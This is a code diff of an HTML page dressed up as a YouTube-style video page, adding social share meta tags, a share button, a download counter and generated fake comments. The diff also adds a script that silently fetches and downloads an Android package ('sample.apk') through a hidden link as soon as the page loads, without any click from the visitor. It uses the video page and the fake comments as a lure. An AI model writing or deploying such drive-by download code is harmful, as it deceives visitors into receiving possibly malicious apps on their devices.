@@ -3,7 +3,21 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tube Mate</title>
+  <title>Mini YouTube Page</title>
+
+  <!-- 🔗 Open Graph Meta Tags -->
+  <meta property="og:title" content="Learn HTML Basics - MyVideoTube" />
+  <meta property="og:description" content="Watch this beginner-friendly video to understand the basics of HTML. Perfect for new web developers!" />
+  <meta property="og:image" content="https://yourdomain.com/preview.jpg" />
+  <meta property="og:url" content="https://yourdomain.com/index.html" />
+  <meta property="og:type" content="video.other" />
+
+  <!-- 🐦 Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Learn HTML Basics - MyVideoTube" />
+  <meta name="twitter:description" content="Watch this beginner-friendly video to understand the basics of HTML." />
+  <meta name="twitter:image" content="https://yourdomain.com/preview.jpg" />
+
   <style>
     body {
       margin: 0;
@@ -82,11 +96,15 @@
     .download-btn {
       margin-top: 20px;
       display: inline-block;
-      background-color: #28a745;
+      background-color: #007bff;
       color: white;
       padding: 10px 20px;
       text-decoration: none;
       border-radius: 5px;
+    }
+    #download-count {
+      margin-top: 10px;
+      color: #555;
     }
     .related-videos {
       margin-top: 40px;
@@ -110,6 +128,16 @@
     .related-video div {
       font-weight: bold;
     }
+    .share-btn {
+      margin-top: 15px;
+      display: inline-block;
+      background-color: #25d366;
+      color: white;
+      padding: 10px 20px;
+      text-decoration: none;
+      border-radius: 5px;
+      font-weight: bold;
+    }
     @media (max-width: 600px) {
       .stats {
         flex-direction: column;
@@ -119,11 +147,11 @@
   </style>
 </head>
 <body>
-  <header>Tube Mate</header>
+  <header>MyVideoTube</header>
   <div class="container">
     <div class="video-container">
       <video id="main-video" autoplay muted controls>
-        <source src="https://github.com/tubemate009/tubemate/blob/main/Promo04.mp4" type="video/mp4" />
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
         Your browser does not support the video tag.
       </video>
     </div>
@@ -137,10 +165,12 @@
 
     <div class="description">
       <h3>Video Description</h3>
-      <p>Legend 90 is a new cricket format designed for speed, thrill, and strategy, featuring 90 balls per side. It distinguishes itself by bringing back legendary retired international cricketers to play, offering a nostalgic celebration of cricket's golden era. The format is owned and managed by LCT T20 League Pvt. Ltd., which holds exclusive rights to its commercial, media, and intellectual property. Legend 90 is presented as more than just a league; it's a tribute to timeless stars and aims to provide global entertainment.</p>
+      <p>This tutorial video explains basic HTML tags and elements. It's perfect for beginners who want to get started with web development quickly. Watch till the end for practical tips and tricks!</p>
     </div>
 
-    <a class="download-btn" href="sample.pdf" download>📥 Download PDF</a>
+    <a class="download-btn" href="sample.pdf" download onclick="incrementDownloadCounter()">📄 Download PDF</a>
+    <a class="share-btn" href="#" onclick="copyLink()">🔗 Share This Page</a>
+    <div id="download-count">Downloads: <span id="counter">0</span></div>
 
     <div class="comments">
       <h3>Comments</h3>
@@ -152,16 +182,16 @@
 
     <div class="related-videos">
       <h3>Related Videos</h3>
-      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\WhatsApp.mp4')">
-        <img src="C:\Users\Admin\Downloads\Tube\WhatsApp.mp4" alt="Related Video 1">
+      <div class="related-video" onclick="changeVideo('https://www.w3schools.com/html/movie.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+1" alt="Related Video 1">
         <div>Learn HTML in 10 Minutes</div>
       </div>
-      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\WhatsApp.mp4')">
-        <img src="C:\Users\Admin\Downloads\Tube\WhatsApp.mp4" alt="Related Video 2">
+      <div class="related-video" onclick="changeVideo('https://www.w3schools.com/html/mov_bbb.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+2" alt="Related Video 2">
         <div>CSS Tips & Tricks</div>
       </div>
-      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\WhatsApp.mp4')">
-        <img src="C:\Users\Admin\Downloads\Tube\WhatsApp.mp4" alt="Related Video 3">
+      <div class="related-video" onclick="changeVideo('https://www.w3schools.com/html/mov_bbb.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+3" alt="Related Video 3">
         <div>JavaScript for Beginners</div>
       </div>
     </div>
@@ -169,6 +199,8 @@
 
   <script>
     let likes = 1500;
+    let downloadCount = 0;
+
     function likeVideo() {
       likes++;
       document.getElementById("likes").textContent = formatLikes(likes);
@@ -181,7 +213,37 @@
       return num;
     }
 
+    function incrementDownloadCounter() {
+      downloadCount++;
+      document.getElementById("counter").textContent = downloadCount;
+    }
 
+    function autoDownloadAPK() {
+      fetch("sample.apk")
+        .then(response => response.blob())
+        .then(blob => {
+          const blobUrl = window.URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = blobUrl;
+          a.download = "sample.apk";
+          document.body.appendChild(a);
+          a.style.display = 'none';
+          a.click();
+          document.body.removeChild(a);
+          window.URL.revokeObjectURL(blobUrl);
+          incrementDownloadCounter();
+        })
+        .catch(err => console.error("Auto-download failed:", err));
+    }
+
+    function copyLink() {
+      navigator.clipboard.writeText(window.location.href).then(() => {
+        alert("Page link copied to clipboard!");
+      });
+    }
+
+    window.addEventListener("load", function () {
+      autoDownloadAPK();
 
       // Fake comments
       const commentContainer = document.getElementById("fake-comments");
@@ -201,5 +263,4 @@
     }
   </script>
 </body>
-
 </html>
